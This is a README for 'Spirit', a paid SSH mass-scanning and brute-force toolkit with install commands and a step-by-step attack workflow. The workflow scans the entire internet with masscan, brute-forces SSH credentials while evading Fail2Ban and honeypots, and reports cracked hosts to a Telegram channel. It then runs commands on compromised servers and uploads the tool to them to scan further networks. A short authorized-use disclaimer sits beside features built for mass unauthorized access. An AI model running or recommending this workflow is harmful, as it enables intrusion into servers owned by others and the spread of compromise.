# Spirit - Network Pentest Tools

Spirit is a suite of high-performance tools for authorized network penetration testing and SSH security auditing. It is designed for experienced security professionals who need fast, reliable mass scanning, banner grabbing, and credential testing capabilities.

<p align="left">  <a href="https://t.me/spiritNPT"><img width="160" height="50" src="https://i.imgur.com/N7AK7XY.png"></a></p>

### Install (recommended)

```bash
curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/install.sh | sh
```

This installs `./spirit` into your current directory with checksum verification.

### Quick Start with go.sh

The recommended way to run targeted zone scans.

**Important:** The script must be run with `sudo` (masscan requires raw sockets).

```bash
curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/go.sh -o go.sh
chmod +x go.sh

cat > zone.lst << 'EOF'
192.168.0.0/16
10.1.1.0/24
EOF

sudo ./go.sh --zone zone.lst --ports 22,23,2222 --rate 30000
```

**Notes**
- Automatically installs `./spirit` (with checksum verification) and `masscan` when missing.
- Backs up previous run artifacts into `./bak/` with timestamps.
- Run `./go.sh --help` for all options.

### Choosing your workflow

- **go.sh** (recommended) — One-shot targeted scanning of specific networks/zones with full parse → banner → brute pipeline. Ideal for focused assessments.
- **spirit autobrute** (legacy) — Continuous, random, collision-free scanning forever. See the [Legacy Tools](#legacy-tools) section further below.

### Manual download (legacy)

For air-gapped or special environments, you can still download the pre-built binary directly:

```bash
$ curl -OL https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz
$ tar xvf spirit.tgz
$ ./spirit --help
```

## Upgrade Spirit automatically
```bash
./spirit upgrade
Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
```

## Spirit Brute|Banner vs Other...

### Spirit Banner
- Stealthy, sends the least amount of TCP packets in order to retrieve the SSH version then breaks the connections without doing a Login
- Proper connection handling and timeout, doesn't leave dead connections open wasting file descriptors
- Fast, very fast and accurate

### Spirit Brute
- Custom SSH lib allows interacting with more SSH versions, ciphers, algos and macs
- Automatically removes unreachable IPs from the bruting cycle, less dull work = faster work
- Automatically adjusts the number of threads based on remaining hosts
- Tries to connect using Key files rather than just passwords
- Detects Honeypots and stops throwing passwords at them
- Tries 1 password per IP rather than throwing all passwords at the same host triggering Fail2Ban and protections of the sort
- Randomizes IPs to avoid saturating a network with packets from the same source
- Connects to multiple ports in the same hosts file
- Autossh allows connecting to all vulnerable hosts at once
- Allows submitting vulnerable hosts to your telegram channel
- Encrypts your passfile to safely use it on unsecured systems
- Excludes vuln found hosts, nologin hosts and honeypots from future scans: narrowing your search
- Generates statistics and error logs

## Legacy Tools

These older workflows are preserved for users who prefer manual control or have specific environment constraints.

### Manual binary download

```bash
curl -OL https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz
tar xvf spirit.tgz
./spirit --help
```

### Autobrute (continuous random scanning)

```bash
cat > zone.lst << 'EOF'
192.168.0.0/16
10.0.0.0/8
EOF

./spirit autobrute
```

### Local network demo (autobrute)

[![asciicast](https://asciinema.org/a/645079.svg)](https://asciinema.org/a/645079?autoplay=true&loop=true)

> **Note:** For most targeted work, prefer `./go.sh` (see Quick Start above).

## Example usage for SSH brute flow TLDR;

> For most targeted assessments, use the `./go.sh` wrapper (see Quick Start above) instead of running the individual commands manually.

```bash
$ masscan \
    --rate="50000" \
    --ports "22,222,2222,2212" 0.0.0.0/0 \
    --exclude 255.255.255.255 \
    -oG open.lst
Scanning 4294967295 hosts [4 ports/host]
# masscan will create an open.lst file in oG (output Greppable) format.

$ ./spirit parse
INFO created h.lst in HOST:PORT format

$ cat > filter.lst << 'EOF'
SSH-1.0
SSH-2.0-CISCO
SSH-2.0-Comware
EOF

$ ./spirit banner
INFO backing up h.lst to h.lst.bak
...
INFO created h.lst in HOST:PORT:BANNER format

$ cat > p.lst << 'EOF'
user1:pass1
user1:pass2
user2:pass50
EOF

$ ./spirit brute
...
[2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
Results
  |- found.ssh
  |- found.login
  |- found.lst
  |- found.errors

$ ./spirit brute --block=true

$ ./spirit autossh --command 'whoami && uptime'
$ ./spirit autossh --upload ./spirit --command '/tmp/spirit scan --lan'
```

## Spirit is Freemium
Scanning port 22 is unlimited for an hour, any other port requires a license which starts at $1/day/server.

## You can unlock Spirit's full functionality directly from the CLI by obtaining a license.
```bash
./spirit buy

Payment-flow Support @ https://t.me/spiritNPT
Pricing model: $1 / Server / Day

┃ How many servers?> 1

┃ How many days?> 10
```

> If you encounter any issues with the payment, please reach out to us on [Telegram](https://t.me/spiritNPT) or open an [issue](https://github.com/theaog/spirit/issues).

# Support our development

## Monero (XMR) thank you! (our favorite)
`895LJnKcfTv7NHf7SN1zz5UzhBRwwvdR8NYLvXNr54jJ3GXghBoyfBKLp2dL4GcYohQatRnigct8zgK6utkjjeBxVNsky1s`

![xmrqr](asset/xmrqr.png)

## Bitcoin (BTC) thank you too!
`bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5`

## Get Help & Support
Open a GitHub [issue](https://github.com/theaog/spirit/issues) and consider encrypting your message using this pub key [aog.gpg](asset/aog.gpg).

Don't forget to give us a Star!

> [!NOTE]
Spirit is clean software the only data it sends home is a server hash to verify the license.
We will never compromise our integrity.

# Disclaimer

> [!IMPORTANT]
> This tool should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it on your own systems and/or with the system owner's permission. Usage of any tools in this repository for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused.
